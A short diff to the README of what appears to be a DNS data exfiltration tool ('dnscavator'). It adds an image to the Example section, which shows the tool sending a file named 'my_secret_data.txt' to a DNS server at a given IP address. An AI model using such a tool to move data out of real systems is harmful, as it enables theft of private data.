@@ -40,6 +40,9 @@ This tool is provided for educational and ethical testing purposes only. Using t
 
 ## Example
 
+![image](https://github.com/user-attachments/assets/b924d68c-38a7-47d7-9f52-d4d5931215f9)
+
+
 python dnscavator.py
 Enter the path to the file you want to send: my_secret_data.txt
 Enter the IP address of the DNS server to send data to: 192.168.1.100
